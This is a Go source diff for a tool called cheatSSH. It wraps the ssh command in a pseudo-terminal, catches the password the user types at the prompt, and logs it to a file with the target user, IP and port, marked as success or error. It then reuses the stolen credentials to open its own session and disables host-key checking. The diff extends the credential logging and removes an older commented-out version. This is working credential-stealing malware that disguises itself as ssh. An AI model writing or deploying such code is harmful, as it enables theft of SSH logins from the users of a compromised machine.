@@ -13,7 +13,7 @@ import (
 	"time"
 )
 
-var SSHIgnore = regexp.MustCompile("not a terminal")
+//var SSHIgnore = regexp.MustCompile("not a terminal")
 var SSHAsk = regexp.MustCompile(`(assword.*:)|(attempts)|(密码.*:)|(重试)|(错误)`)
 var SSHAskEnd = regexp.MustCompile(`(: $)|(：$)`)
 var SSHSuccess = regexp.MustCompile(`(Welcome to)|(Last login)|(Last failed login)`)
@@ -21,13 +21,10 @@ var SSHIfFirst = regexp.MustCompile(`^(The authenticity)`)
 
 func cheatSSH() string {
 	var pty, _ = term.OpenPTY()
-	var password string
+	var user, password, ip, port string
 	var writeMsg = make(chan struct{})
 	var readLock = make(chan struct{})
 	var AskPass bool
-	//TODO 添加全局变量来设置选项
-	//TODO 添加时间
-	//TODO 添加写入ip，端口，用户
 	c := exec.Command("ssh", os.Args[1:]...)
 	c.Stdout = pty.Slave
 	c.Stdin = pty.Slave
@@ -84,13 +81,17 @@ func cheatSSH() string {
 					return
 				}
 				if password != "" && strings.TrimSpace(line) != "" {
+					if user == "" || ip == "" || port == "" {
+						user, ip, port = getSSHInfo()
+					}
+					prefix := user + " " + ip + " " + port
 					if SSHSuccess.MatchString(line) {
-						writePassword(password + " success")
+						writePassword(prefix + " " + password + " success")
 						c.Process.Kill()
 						readLock <- struct{}{}
 						return
 					} else {
-						writePassword(password + " error")
+						writePassword(prefix + " " + password + " error")
 						password = ""
 					}
 				}
@@ -114,19 +115,21 @@ func cheatSSH() string {
 		}
 	}()
 	c.Wait()
-	time.Sleep(time.Second / 2)
+	if AskPass {
+		time.Sleep(time.Second / 2)
+	}
 	pty.Close()
 	<-readLock
 
 	if AskPass && password != "" {
-		startSSHShell(password)
+		startSSHShell(user, password, ip, port)
 	}
 	if !AskPass && password == "" {
 		execScript(cmd)
 	}
 	return password
 }
-func startSSHShell(password string) {
+func getSSHInfo() (string, string, string) {
 	var user, ip, port string
 	infoRE := regexp.MustCompile(`\s(.+?)@(\d+\.\d+\.\d+\.\d+)`)
 	info := infoRE.FindAllStringSubmatch(strings.Join(os.Args, " "), 1)
@@ -136,15 +139,19 @@ func startSSHShell(password string) {
 		user = info[0][1]
 		ip = info[0][2]
 	} else {
-		return
+		return "", "", ""
 	}
 	if len(portInfo) == 0 {
 		port = "22"
 	} else if len(portInfo[0]) == 2 {
 		port = portInfo[0][1]
 	} else {
-		return
+		return "", "", ""
 	}
+	return user, ip, port
+}
+func startSSHShell(user string, password string, ip string, port string) {
+
 	client, err := ssh.Dial("tcp", ip+":"+port, &ssh.ClientConfig{
 		User:            user,
 		Auth:            []ssh.AuthMethod{ssh.Password(password)},
@@ -171,115 +178,3 @@ func startSSHShell(password string) {
 	err = session.Wait()
 
 }
-
-//func cheatSSH()(bool,string){
-//	inputArg := strings.Join(os.Args[1:]," ")
-//	var pass []byte
-//	var b = make([]byte,1024)
-//	e,_,err := expect.Spawn("ssh "+inputArg,-1)
-//	if err != nil{
-//		return true,""
-//	}
-//	defer e.Close()
-//	time.Sleep(time.Second)
-//	e.Read(b)
-//	text := string(b)
-//	textLen := len(strings.Split(strings.TrimSpace(text),"\n"))
-//	firstTime := strings.Contains(text,"fingerprint")
-//	if textLen > 1 && !strings.Contains(text,"not a terminal") && !firstTime{
-//		return true,""
-//	}
-//	ok,_ := regexp.Match("assword.*:",b)
-//	if !ok && !firstTime{
-//		return true,""
-//	}
-//	if firstTime{
-//		fmt.Print(text)
-//		var answer string
-//		fmt.Scanln(&answer)
-//		if strings.Contains(strings.ToLower(answer),"n"){
-//			return false,""
-//		}
-//		e.Send("yes\r\n")
-//		text,_,_ = e.Expect(passRE,-1)
-//	}
-//	fmt.Print(text)
-//	pass,_ = gopass.GetPasswd()
-//	e.Send(string(pass)+"\r\n")
-//	time.Sleep(sshWaitTime)
-//	for i:=0;i<3;i++ {
-//		var inputflag = false
-//		output, _, _ := e.Expect(anyRE, -1)
-//		if strings.Contains(output, "try again") {
-//			inputflag = true
-//			writePassword(string(pass) + " error")
-//			fmt.Print(output)
-//			if !strings.Contains(output,"assword"){
-//				output,_,_ = e.Expect(passRE,-1)
-//				fmt.Print(output)
-//			}
-//		}else if strings.Contains(output,"Welcome"){
-//			if !strings.Contains(output,"Last login"){
-//				output,_,_ = e.Expect(regexp.MustCompile("Last login"),-1)
-//				fmt.Print(output)
-//			}
-//			writePassword(string(pass)+" success")
-//
-//			return true,string(pass)
-//		}else{
-//			writePassword(string(pass) + " error")
-//			fmt.Print(output)
-//			return false,""
-//		}
-//		if inputflag{
-//			pass,_ = gopass.GetPasswd()
-//			e.Send(string(pass)+"\r\n")
-//			time.Sleep(sshWaitTime)
-//		}
-//	}
-//	return true,string(pass)
-//}
-//func startSSHShell(password string){
-//	var user,ip,port string
-//	infoRE := regexp.MustCompile(`\s(.+?)@(\d+\.\d+\.\d+\.\d+)`)
-//	info := infoRE.FindAllStringSubmatch(strings.Join(os.Args," "),1)
-//	portRE := regexp.MustCompile(`-p\s+(\d+)`)
-//	portInfo := portRE.FindAllStringSubmatch(strings.Join(os.Args," "),1)
-//	if len(info[0]) == 3{
-//		user = info[0][1]
-//		ip = info[0][2]
-//	}else{
-//		return
-//	}
-//	if len(portInfo) == 0{
-//		port = "22"
-//	}else if len(portInfo[0]) == 2{
-//		port = portInfo[0][1]
-//	}else{
-//		return
-//	}
-//	client,err := ssh.Dial("tcp", ip+":"+port, &ssh.ClientConfig{
-//		User:            user,
-//		Auth:            []ssh.AuthMethod{ssh.Password(password)},
-//		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-//	})
-//	checkErr(err)
-//	session, err := client.NewSession()
-//	defer session.Close()
-//	fd := int(os.Stdin.Fd())
-//	oldState, err := terminal.MakeRaw(fd)
-//	checkErr(err)
-//	defer terminal.Restore(fd, oldState)
-//	// 拿到当前终端文件描述符
-//	termWidth, termHeight, err := terminal.GetSize(fd)
-//	// request pty
-//	err = session.RequestPty("xterm-256color", termHeight, termWidth, ssh.TerminalModes{})
-//	checkErr(err)
-//	// 对接 std
-//	session.Stdout = os.Stdout
-//	session.Stderr = os.Stderr
-//	session.Stdin = os.Stdin
-//
-//	err = session.Shell()
-//	err = session.Wait()
-//}
